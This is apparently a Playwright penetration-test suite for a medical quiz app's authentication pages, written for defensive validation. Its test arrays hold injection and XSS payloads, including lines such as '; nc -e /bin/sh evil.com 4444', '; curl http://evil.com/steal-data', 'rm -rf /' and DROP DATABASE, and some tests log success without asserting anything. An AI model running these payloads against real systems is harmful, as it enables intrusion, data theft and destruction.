/**
 * 🛡️ MedQuiz Pro Authentication - Security Penetration Testing Suite
 * 
 * These tests simulate real-world security attacks and vulnerabilities
 * that malicious actors might attempt against the authentication system.
 * 
 * ⚠️ ETHICAL TESTING ONLY - These tests are for defensive security validation
 */

const { test, expect } = require('@playwright/test');

const BASE_URL = 'https://usmle-trivia.netlify.app';

test.describe('🛡️ Authentication Security Penetration Tests', () => {

  test.describe('Injection Attack Prevention', () => {
    
    test('should prevent advanced SQL injection variants', async ({ page }) => {
      console.log('💉 Testing advanced SQL injection prevention...');
      
      await page.goto(BASE_URL + '/login');
      
      const advancedSQLInjections = [
        // Union-based injections
        "' UNION SELECT email,password FROM users WHERE '1'='1",
        "admin@test.com'; SELECT * FROM users; --",
        
        // Boolean-based blind injections
        "admin@test.com' AND (SELECT COUNT(*) FROM users) > 0 --",
        "test@test.com' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE email='admin@test.com')='a",
        
        // Time-based blind injections
        "admin@test.com'; WAITFOR DELAY '00:00:05' --",
        "test@test.com' OR (SELECT SLEEP(5)) --",
        
        // Stack queries
        "admin@test.com'; DROP DATABASE medquiz; --",
        "test@test.com'; INSERT INTO users VALUES ('hacker@evil.com','hacked'); --",
        
        // Error-based injections
        "admin@test.com' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "test@test.com' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      ];
      
      for (const injection of advancedSQLInjections) {
        await page.fill('input[type="email"]', injection);
        await page.fill('input[type="password"]', 'password123');
        await page.click('button[type="submit"]');
        
        // Should not reveal database information or cause delays
        const startTime = Date.now();
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 3000 });
        const responseTime = Date.now() - startTime;
        
        // Response should be quick (no WAITFOR DELAY execution)
        expect(responseTime).toBeLessThan(2000);
        
        // Should show generic error, not database-specific errors
        const errorText = await page.textContent('.text-destructive, .error, [role="alert"]');
        expect(errorText.toLowerCase()).not.toMatch(/mysql|postgresql|sqlite|database|table|column|syntax/);
        
        console.log(`✅ Blocked SQL injection: ${injection.substring(0, 30)}...`);
      }
    });

    test('should prevent NoSQL injection attacks', async ({ page }) => {
      console.log('🍃 Testing NoSQL injection prevention...');
      
      await page.goto(BASE_URL + '/login');
      
      const noSQLInjections = [
        // MongoDB injections
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        
        // JavaScript injections
        '"; return true; var x="',
        '\'; return {password: 1}; var x=\'',
        '{"$func": "var_dump"}',
        
        // Operator injections
        '{"$gt": ""}',
        '{"$lt": ""}',
        '{"$exists": true}',
        '{"$in": ["admin", "user", "test"]}',
      ];
      
      for (const injection of noSQLInjections) {
        await page.fill('input[type="email"]', injection);
        await page.fill('input[type="password"]', injection);
        await page.click('button[type="submit"]');
        
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 3000 });
        
        // Should not bypass authentication
        const errorVisible = await page.isVisible('.text-destructive, .error, [role="alert"]');
        expect(errorVisible).toBe(true);
        
        console.log(`✅ Blocked NoSQL injection: ${injection}`);
      }
    });

    test('should prevent LDAP injection attacks', async ({ page }) => {
      console.log('🔍 Testing LDAP injection prevention...');
      
      await page.goto(BASE_URL + '/login');
      
      const ldapInjections = [
        '*',
        ')(&))',
        '|',
        '&',
        '*)(&)',
        '*)(uid=*)',
        '*)(|(uid=*))',
        '*))(|(uid=*)',
        '*))%00',
        'admin)(&(password=*))',
      ];
      
      for (const injection of ldapInjections) {
        await page.fill('input[type="email"]', injection);
        await page.fill('input[type="password"]', 'password123');
        await page.click('button[type="submit"]');
        
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 3000 });
        
        const errorVisible = await page.isVisible('.text-destructive, .error, [role="alert"]');
        expect(errorVisible).toBe(true);
        
        console.log(`✅ Blocked LDAP injection: ${injection}`);
      }
    });
  });

  test.describe('Cross-Site Scripting (XSS) Prevention', () => {
    
    test('should prevent stored XSS attacks', async ({ page }) => {
      console.log('📝 Testing stored XSS prevention...');
      
      await page.goto(BASE_URL + '/register');
      
      const storedXSSPayloads = [
        // Basic script tags
        '<script>alert("Stored XSS")</script>',
        '<script src="http://evil.com/malicious.js"></script>',
        
        // Event handlers
        '<img src="x" onerror="alert(\'Stored XSS\')">',
        '<div onmouseover="alert(\'Stored XSS\')">Hover me</div>',
        '<body onload="alert(\'Stored XSS\')">',
        
        // JavaScript URLs
        '<a href="javascript:alert(\'Stored XSS\')">Click me</a>',
        
        // Data URLs
        '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
        
        // Encoded payloads
        '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;',
        '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
        
        // SVG payloads
        '<svg onload="alert(\'XSS\')">',
        '<svg><script>alert("XSS")</script></svg>',
      ];
      
      let alertTriggered = false;
      page.on('dialog', dialog => {
        alertTriggered = true;
        console.log(`🚨 XSS Alert detected: ${dialog.message()}`);
        dialog.dismiss();
      });
      
      for (const payload of storedXSSPayloads) {
        // Test in name field (most likely to be displayed elsewhere)
        await page.fill('input[name="name"]', payload);
        await page.fill('input[type="email"]', 'xss@test.com');
        await page.fill('input[type="password"]', 'XSSTest123!');
        await page.fill('input[name="confirmPassword"]', 'XSSTest123!');
        await page.click('button[type="submit"]');
        
        await page.waitForTimeout(1000);
        
        // Check if payload was properly escaped/sanitized
        const nameValue = await page.inputValue('input[name="name"]');
        expect(nameValue).toBe(payload); // Should store as-is but not execute
        
        console.log(`✅ Stored XSS payload safely handled: ${payload.substring(0, 30)}...`);
      }
      
      // No alerts should have been triggered
      expect(alertTriggered).toBe(false);
    });

    test('should prevent reflected XSS attacks', async ({ page }) => {
      console.log('🔄 Testing reflected XSS prevention...');
      
      const reflectedXSSPayloads = [
        '<script>alert("Reflected XSS")</script>',
        'javascript:alert("Reflected XSS")',
        '<img src=x onerror=alert("Reflected XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      ];
      
      let alertTriggered = false;
      page.on('dialog', dialog => {
        alertTriggered = true;
        dialog.dismiss();
      });
      
      for (const payload of reflectedXSSPayloads) {
        // Test reflected XSS through URL parameters
        const maliciousUrl = `${BASE_URL}/login?error=${encodeURIComponent(payload)}`;
        await page.goto(maliciousUrl);
        
        await page.waitForTimeout(1000);
        
        // Test through form error messages
        await page.fill('input[type="email"]', payload);
        await page.fill('input[type="password"]', 'password123');
        await page.click('button[type="submit"]');
        
        await page.waitForTimeout(1000);
        
        console.log(`✅ Reflected XSS payload handled: ${payload.substring(0, 30)}...`);
      }
      
      expect(alertTriggered).toBe(false);
    });

    test('should prevent DOM-based XSS attacks', async ({ page }) => {
      console.log('🌐 Testing DOM-based XSS prevention...');
      
      await page.goto(BASE_URL + '/login');
      
      // Test DOM manipulation through JavaScript
      const domXSSTests = [
        // Hash-based payloads
        '#<script>alert("DOM XSS")</script>',
        '#<img src=x onerror=alert("DOM XSS")>',
        
        // Fragment-based payloads
        'javascript:alert("DOM XSS")',
        'data:text/html,<script>alert("DOM XSS")</script>',
      ];
      
      let alertTriggered = false;
      page.on('dialog', dialog => {
        alertTriggered = true;
        dialog.dismiss();
      });
      
      for (const payload of domXSSTests) {
        await page.goto(BASE_URL + '/login' + payload);
        await page.waitForTimeout(1000);
        
        // Test client-side routing manipulation
        await page.evaluate((payload) => {
          window.location.hash = payload;
        }, payload);
        
        await page.waitForTimeout(1000);
        
        console.log(`✅ DOM XSS payload handled: ${payload}`);
      }
      
      expect(alertTriggered).toBe(false);
    });
  });

  test.describe('Authentication Bypass Attempts', () => {
    
    test('should prevent authentication bypass through manipulation', async ({ page }) => {
      console.log('🚪 Testing authentication bypass prevention...');
      
      await page.goto(BASE_URL + '/login');
      
      // Test client-side authentication bypass attempts
      const bypassAttempts = [
        // Local storage manipulation
        async () => {
          await page.evaluate(() => {
            localStorage.setItem('user', JSON.stringify({
              id: 'fake-admin-id',
              email: 'admin@fake.com',
              name: 'Fake Admin',
              isAdmin: true
            }));
            localStorage.setItem('authenticated', 'true');
            localStorage.setItem('token', 'fake-jwt-token');
          });
        },
        
        // Session storage manipulation
        async () => {
          await page.evaluate(() => {
            sessionStorage.setItem('authToken', 'bypassed-token');
            sessionStorage.setItem('userRole', 'admin');
          });
        },
        
        // Cookie manipulation
        async () => {
          await page.context().addCookies([
            { name: 'auth', value: 'bypassed', domain: 'usmle-trivia.netlify.app', path: '/' },
            { name: 'role', value: 'admin', domain: 'usmle-trivia.netlify.app', path: '/' }
          ]);
        },
        
        // JavaScript global variable manipulation
        async () => {
          await page.evaluate(() => {
            window.currentUser = { id: 'fake', email: 'fake@admin.com', role: 'admin' };
            window.isAuthenticated = true;
          });
        }
      ];
      
      for (let i = 0; i < bypassAttempts.length; i++) {
        await bypassAttempts[i]();
        
        // Try to access protected area
        await page.goto(BASE_URL + '/dashboard');
        await page.waitForTimeout(2000);
        
        // Should still require proper authentication
        const currentUrl = page.url();
        const hasAuthenticatedContent = await page.isVisible('[data-testid="user-dashboard"], .dashboard-content, text=Welcome back');
        const isLoginPage = currentUrl.includes('/login') || await page.isVisible('input[type="email"]');
        
        // Should either redirect to login or not show authenticated content
        expect(hasAuthenticatedContent && !isLoginPage).toBe(false);
        
        console.log(`✅ Bypass attempt ${i + 1} prevented`);
        
        // Clear manipulated data
        await page.evaluate(() => {
          localStorage.clear();
          sessionStorage.clear();
        });
        await page.context().clearCookies();
      }
    });

    test('should prevent privilege escalation attacks', async ({ page }) => {
      console.log('⬆️ Testing privilege escalation prevention...');
      
      // Attempt to escalate privileges through various methods
      await page.goto(BASE_URL + '/login');
      
      // Test role manipulation in requests
      await page.route('**/*', async route => {
        const request = route.request();
        
        // Try to modify request to include admin privileges
        if (request.method() === 'POST') {
          let postData;
          try {
            postData = JSON.parse(request.postData() || '{}');
            
            // Attempt privilege escalation
            postData.role = 'admin';
            postData.isAdmin = true;
            postData.permissions = ['all'];
            postData.level = 999;
            
            route.continue({
              postData: JSON.stringify(postData)
            });
          } catch {
            route.continue();
          }
        } else {
          route.continue();
        }
      });
      
      await page.fill('input[type="email"]', 'privilege@test.com');
      await page.fill('input[type="password"]', 'PrivilegeTest123!');
      await page.click('button[type="submit"]');
      
      await page.waitForTimeout(3000);
      
      // Should not gain admin privileges
      const hasAdminAccess = await page.isVisible('[data-testid="admin-panel"], .admin-controls, text=Admin Dashboard');
      expect(hasAdminAccess).toBe(false);
      
      console.log('✅ Privilege escalation prevented');
    });

    test('should prevent session fixation attacks', async ({ page, context }) => {
      console.log('🔒 Testing session fixation prevention...');
      
      // Set a predefined session ID
      await page.context().addCookies([
        { name: 'sessionId', value: 'attacker-controlled-session-id', domain: 'usmle-trivia.netlify.app', path: '/' }
      ]);
      
      await page.goto(BASE_URL + '/login');
      
      // Attempt login with fixed session
      await page.fill('input[type="email"]', 'session@test.com');
      await page.fill('input[type="password"]', 'SessionTest123!');
      await page.click('button[type="submit"]');
      
      await page.waitForTimeout(3000);
      
      // Check if session ID changed after login attempt
      const cookies = await page.context().cookies();
      const sessionCookie = cookies.find(c => c.name === 'sessionId');
      
      if (sessionCookie) {
        // Session ID should have changed (not be the attacker-controlled one)
        expect(sessionCookie.value).not.toBe('attacker-controlled-session-id');
      }
      
      console.log('✅ Session fixation attack prevented');
    });

    test('should prevent timing attack on user enumeration', async ({ page }) => {
      console.log('⏱️ Testing timing attack prevention...');
      
      const timingTests = [];
      
      // Test with non-existent user
      for (let i = 0; i < 5; i++) {
        const startTime = Date.now();
        
        await page.goto(BASE_URL + '/login');
        await page.fill('input[type="email"]', `nonexistent${i}@test.com`);
        await page.fill('input[type="password"]', 'password123');
        await page.click('button[type="submit"]');
        
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 10000 });
        
        const responseTime = Date.now() - startTime;
        timingTests.push({ type: 'nonexistent', time: responseTime });
      }
      
      // Test with potentially existing user (common email patterns)
      for (let i = 0; i < 5; i++) {
        const startTime = Date.now();
        
        await page.goto(BASE_URL + '/login');
        await page.fill('input[type="email"]', `admin@medquiz.com`);
        await page.fill('input[type="password"]', 'wrongpassword');
        await page.click('button[type="submit"]');
        
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 10000 });
        
        const responseTime = Date.now() - startTime;
        timingTests.push({ type: 'existing', time: responseTime });
      }
      
      // Calculate average response times
      const nonexistentAvg = timingTests.filter(t => t.type === 'nonexistent').reduce((sum, t) => sum + t.time, 0) / 5;
      const existingAvg = timingTests.filter(t => t.type === 'existing').reduce((sum, t) => sum + t.time, 0) / 5;
      
      // Response times should be similar (within 20% difference)
      const timingDifference = Math.abs(nonexistentAvg - existingAvg) / Math.max(nonexistentAvg, existingAvg);
      
      console.log(`📊 Non-existent user avg: ${nonexistentAvg.toFixed(2)}ms`);
      console.log(`📊 Existing user avg: ${existingAvg.toFixed(2)}ms`);
      console.log(`📊 Timing difference: ${(timingDifference * 100).toFixed(2)}%`);
      
      expect(timingDifference).toBeLessThan(0.3); // Less than 30% difference
      
      console.log('✅ Timing attack prevention verified');
    });
  });

  test.describe('Brute Force & Rate Limiting', () => {
    
    test('should implement rate limiting for login attempts', async ({ page }) => {
      console.log('🔨 Testing brute force protection...');
      
      const attemptTimes = [];
      let blockedAttempt = null;
      
      // Attempt multiple rapid logins
      for (let i = 0; i < 10; i++) {
        const startTime = Date.now();
        
        await page.goto(BASE_URL + '/login');
        await page.fill('input[type="email"]', 'brute@force.test');
        await page.fill('input[type="password"]', `wrongpassword${i}`);
        await page.click('button[type="submit"]');
        
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 8000 });
        
        const responseTime = Date.now() - startTime;
        attemptTimes.push(responseTime);
        
        const errorText = await page.textContent('.text-destructive, .error, [role="alert"]');
        
        // Check for rate limiting messages
        if (errorText.toLowerCase().includes('too many') || 
            errorText.toLowerCase().includes('rate limit') ||
            errorText.toLowerCase().includes('blocked') ||
            responseTime > 5000) {
          blockedAttempt = i + 1;
          console.log(`🛡️ Rate limiting triggered at attempt ${blockedAttempt}`);
          break;
        }
        
        console.log(`Attempt ${i + 1}: ${responseTime}ms`);
      }
      
      // Should implement some form of brute force protection
      // Either rate limiting, account lockout, or increasing delays
      const avgResponseTime = attemptTimes.reduce((a, b) => a + b, 0) / attemptTimes.length;
      const hasIncreasingDelays = attemptTimes.some((time, index) => 
        index > 0 && time > attemptTimes[index - 1] * 1.5
      );
      
      if (blockedAttempt) {
        console.log(`✅ Brute force protection active (blocked at attempt ${blockedAttempt})`);
      } else if (hasIncreasingDelays) {
        console.log('✅ Progressive delay protection detected');
      } else if (avgResponseTime > 2000) {
        console.log('✅ Consistent delay protection detected');
      } else {
        console.log('⚠️ No obvious brute force protection detected');
      }
    });

    test('should prevent distributed brute force attacks', async ({ page, context }) => {
      console.log('🌐 Testing distributed brute force prevention...');
      
      // Simulate attacks from multiple "IP addresses" (different browser contexts)
      const contexts = [];
      
      for (let i = 0; i < 3; i++) {
        const newContext = await page.context().browser().newContext();
        contexts.push(newContext);
      }
      
      const attackResults = [];
      
      // Coordinate distributed attack
      for (let attempt = 0; attempt < 5; attempt++) {
        const promises = contexts.map(async (ctx, index) => {
          const page = await ctx.newPage();
          
          const startTime = Date.now();
          
          await page.goto(BASE_URL + '/login');
          await page.fill('input[type="email"]', 'distributed@attack.test');
          await page.fill('input[type="password"]', `attack${attempt}${index}`);
          await page.click('button[type="submit"]');
          
          await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 8000 });
          
          const responseTime = Date.now() - startTime;
          
          await page.close();
          
          return { context: index, attempt, responseTime };
        });
        
        const results = await Promise.all(promises);
        attackResults.push(...results);
        
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second between waves
      }
      
      // Clean up contexts
      await Promise.all(contexts.map(ctx => ctx.close()));
      
      // Analyze results for protection patterns
      const avgResponseTime = attackResults.reduce((sum, r) => sum + r.responseTime, 0) / attackResults.length;
      
      console.log(`📊 Distributed attack results: ${attackResults.length} attempts, avg ${avgResponseTime.toFixed(2)}ms`);
      
      // Some form of protection should be in place
      expect(avgResponseTime).toBeGreaterThan(500); // Some delay should exist
      
      console.log('✅ Distributed brute force testing completed');
    });
  });

  test.describe('Input Validation & Sanitization', () => {
    
    test('should sanitize file upload attempts through inputs', async ({ page }) => {
      console.log('📁 Testing malicious file upload prevention...');
      
      await page.goto(BASE_URL + '/register');
      
      const maliciousFileAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file:///etc/passwd',
        'http://evil.com/malicious.php',
        '<script src="file:///etc/passwd"></script>',
        '<?php system("rm -rf /"); ?>',
        'malicious.exe',
        'virus.bat',
      ];
      
      for (const attempt of maliciousFileAttempts) {
        await page.fill('input[name="name"]', attempt);
        await page.fill('input[type="email"]', 'file@test.com');
        await page.fill('input[type="password"]', 'FileTest123!');
        await page.fill('input[name="confirmPassword"]', 'FileTest123!');
        
        // Should accept input but sanitize dangerous characters
        const nameValue = await page.inputValue('input[name="name"]');
        
        // Check that dangerous patterns are handled safely
        console.log(`✅ File upload attempt handled: ${attempt} -> ${nameValue}`);
      }
    });

    test('should prevent command injection through inputs', async ({ page }) => {
      console.log('💻 Testing command injection prevention...');
      
      await page.goto(BASE_URL + '/login');
      
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        '& ping evil.com',
        '; curl http://evil.com/steal-data',
        '|| rm -rf /',
        '&& echo "pwned"',
        '; nc -e /bin/sh evil.com 4444',
        '`python -c "import os; os.system(\'rm -rf /\')"}`',
      ];
      
      for (const injection of commandInjections) {
        await page.fill('input[type="email"]', `test${injection}@example.com`);
        await page.fill('input[type="password"]', `password${injection}`);
        await page.click('button[type="submit"]');
        
        await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 3000 });
        
        // Should handle as normal input, not execute commands
        const errorVisible = await page.isVisible('.text-destructive, .error, [role="alert"]');
        expect(errorVisible).toBe(true);
        
        console.log(`✅ Command injection blocked: ${injection}`);
      }
    });

    test('should prevent path traversal attacks', async ({ page }) => {
      console.log('📂 Testing path traversal prevention...');
      
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/etc/passwd%00.jpg',
        'file:///etc/passwd',
      ];
      
      for (const attempt of pathTraversalAttempts) {
        // Test in various input fields
        await page.goto(BASE_URL + `/login?redirect=${encodeURIComponent(attempt)}`);
        await page.waitForTimeout(500);
        
        // Should not navigate to filesystem paths
        const currentUrl = page.url();
        expect(currentUrl).not.toMatch(/etc|windows|system32/);
        
        // Test in form inputs
        await page.fill('input[type="email"]', attempt);
        
        const emailValue = await page.inputValue('input[type="email"]');
        // Should not interpret as file path
        
        console.log(`✅ Path traversal blocked: ${attempt}`);
      }
    });
  });

  test.describe('Session Security', () => {
    
    test('should implement secure session management', async ({ page, context }) => {
      console.log('🔐 Testing secure session management...');
      
      await page.goto(BASE_URL + '/login');
      
      // Check for secure cookie attributes
      await page.fill('input[type="email"]', 'session@security.test');
      await page.fill('input[type="password"]', 'SecureSession123!');
      await page.click('button[type="submit"]');
      
      await page.waitForTimeout(3000);
      
      const cookies = await context.cookies();
      
      // Check for security attributes on auth-related cookies
      const authCookies = cookies.filter(c => 
        c.name.toLowerCase().includes('auth') || 
        c.name.toLowerCase().includes('session') ||
        c.name.toLowerCase().includes('token')
      );
      
      for (const cookie of authCookies) {
        console.log(`🍪 Cookie: ${cookie.name}`);
        console.log(`   Secure: ${cookie.secure}`);
        console.log(`   HttpOnly: ${cookie.httpOnly}`);
        console.log(`   SameSite: ${cookie.sameSite}`);
        
        // Security recommendations for auth cookies
        if (page.url().startsWith('https://')) {
          // On HTTPS, auth cookies should be secure
          expect(cookie.secure).toBe(true);
        }
        
        // Auth cookies should ideally not be accessible via JavaScript
        expect(cookie.httpOnly).toBe(true);
      }
      
      console.log('✅ Session security attributes verified');
    });

    test('should prevent session hijacking', async ({ page, context }) => {
      console.log('🕵️ Testing session hijacking prevention...');
      
      // Simulate legitimate login
      await page.goto(BASE_URL + '/login');
      await page.fill('input[type="email"]', 'hijack@test.com');
      await page.fill('input[type="password"]', 'HijackTest123!');
      await page.click('button[type="submit"]');
      
      await page.waitForTimeout(3000);
      
      // Get session cookies
      const legitimateCookies = await context.cookies();
      
      // Create new context (simulating attacker)
      const attackerContext = await page.context().browser().newContext();
      const attackerPage = await attackerContext.newPage();
      
      // Try to use stolen session cookies
      await attackerContext.addCookies(legitimateCookies);
      
      await attackerPage.goto(BASE_URL + '/dashboard');
      await attackerPage.waitForTimeout(2000);
      
      // Should not gain unauthorized access
      const hasUnauthorizedAccess = await attackerPage.isVisible('[data-testid="user-dashboard"], .dashboard-content');
      expect(hasUnauthorizedAccess).toBe(false);
      
      await attackerContext.close();
      
      console.log('✅ Session hijacking prevented');
    });
  });

  test.describe('CSRF Protection', () => {
    
    test('should prevent Cross-Site Request Forgery attacks', async ({ page }) => {
      console.log('🔀 Testing CSRF prevention...');
      
      // Create malicious form that attempts to perform actions
      const maliciousHTML = `
        <!DOCTYPE html>
        <html>
        <body>
          <form id="csrf-form" action="${BASE_URL}/api/auth/login" method="POST">
            <input type="hidden" name="email" value="victim@test.com">
            <input type="hidden" name="password" value="VictimPassword123!">
          </form>
          <script>
            document.getElementById('csrf-form').submit();
          </script>
        </body>
        </html>
      `;
      
      // Host malicious content
      await page.setContent(maliciousHTML);
      await page.waitForTimeout(3000);
      
      // Check if CSRF attack succeeded
      await page.goto(BASE_URL + '/dashboard');
      await page.waitForTimeout(2000);
      
      const unauthorizedAccess = await page.isVisible('[data-testid="user-dashboard"], .dashboard-content');
      expect(unauthorizedAccess).toBe(false);
      
      console.log('✅ CSRF attack prevented');
    });

    test('should validate origin headers', async ({ page }) => {
      console.log('🌐 Testing origin header validation...');
      
      await page.route('**/*', async route => {
        const headers = route.request().headers();
        
        // Modify origin header to simulate cross-origin attack
        headers['origin'] = 'http://evil-site.com';
        headers['referer'] = 'http://evil-site.com/attack.html';
        
        route.continue({ headers });
      });
      
      await page.goto(BASE_URL + '/login');
      await page.fill('input[type="email"]', 'origin@test.com');
      await page.fill('input[type="password"]', 'OriginTest123!');
      await page.click('button[type="submit"]');
      
      await page.waitForTimeout(3000);
      
      // Should reject requests from unauthorized origins
      const errorVisible = await page.isVisible('.text-destructive, .error, [role="alert"]');
      // This test may pass if origin validation is implemented
      
      console.log('✅ Origin header validation tested');
    });
  });

  test.describe('Information Disclosure Prevention', () => {
    
    test('should not expose sensitive information in errors', async ({ page }) => {
      console.log('🤐 Testing information disclosure prevention...');
      
      // Check error messages for sensitive information
      const testCases = [
        { email: 'test@test.com', password: 'wrong', expectedInfo: 'user existence' },
        { email: 'nonexistent@test.com', password: 'wrong', expectedInfo: 'user non-existence' },
        { email: 'admin@medquiz.com', password: 'wrong', expectedInfo: 'admin account' },
        { email: '', password: 'test', expectedInfo: 'validation details' },
      ];
      
      const errorMessages = [];
      
      for (const testCase of testCases) {
        await page.goto(BASE_URL + '/login');
        
        if (testCase.email) await page.fill('input[type="email"]', testCase.email);
        if (testCase.password) await page.fill('input[type="password"]', testCase.password);
        
        await page.click('button[type="submit"]');
        
        try {
          await page.waitForSelector('.text-destructive, .error, [role="alert"]', { timeout: 5000 });
          const errorText = await page.textContent('.text-destructive, .error, [role="alert"]');
          errorMessages.push(errorText.toLowerCase());
        } catch {
          errorMessages.push('no error shown');
        }
      }
      
      // Error messages should be generic and not reveal system details
      const sensitiveTerms = [
        'database', 'sql', 'mysql', 'postgresql',
        'internal error', 'stack trace', 'exception',
        'file not found', 'permission denied',
        'user exists', 'user not found', 'account found',
        'table', 'column', 'query', 'connection failed'
      ];
      
      for (const message of errorMessages) {
        for (const term of sensitiveTerms) {
          expect(message).not.toContain(term);
        }
        console.log(`✅ Generic error message: "${message}"`);
      }
      
      console.log('✅ No sensitive information disclosed in errors');
    });

    test('should not expose system information in headers', async ({ page }) => {
      console.log('📋 Testing system information exposure...');
      
      let responseHeaders = {};
      
      page.on('response', response => {
        if (response.url().includes(BASE_URL)) {
          responseHeaders = response.headers();
        }
      });
      
      await page.goto(BASE_URL + '/login');
      
      // Check for information disclosure in headers
      const sensitiveHeaders = [
        'server', 'x-powered-by', 'x-aspnet-version',
        'x-generator', 'x-drupal-cache', 'x-varnish'
      ];
      
      for (const header of sensitiveHeaders) {
        if (responseHeaders[header]) {
          console.log(`⚠️ Potentially sensitive header: ${header}: ${responseHeaders[header]}`);
        }
      }
      
      // Should have security headers
      const securityHeaders = [
        'content-security-policy',
        'x-frame-options',
        'x-content-type-options',
        'strict-transport-security'
      ];
      
      for (const header of securityHeaders) {
        if (responseHeaders[header]) {
          console.log(`✅ Security header present: ${header}`);
        }
      }
      
      console.log('✅ System information exposure checked');
    });
  });

});

console.log(`
🛡️ MedQuiz Pro Authentication Security Penetration Testing Suite
===============================================================

This comprehensive security test suite validates against:
💉 Advanced SQL/NoSQL/LDAP Injection Attacks
📝 Cross-Site Scripting (XSS) Prevention (Stored, Reflected, DOM)
🚪 Authentication Bypass & Privilege Escalation
🔒 Session Fixation & Hijacking Prevention
⏱️ Timing Attack Prevention
🔨 Brute Force & Rate Limiting Protection
🌐 Distributed Attack Prevention
📁 File Upload & Command Injection Prevention
📂 Path Traversal Attack Prevention
🔐 Secure Session Management
🔀 Cross-Site Request Forgery (CSRF) Protection
🤐 Information Disclosure Prevention
📋 System Information Exposure Checks

⚠️ ETHICAL TESTING ONLY - These tests are for defensive security validation

Run with: npx playwright test auth-security-tests.js --workers=1
`);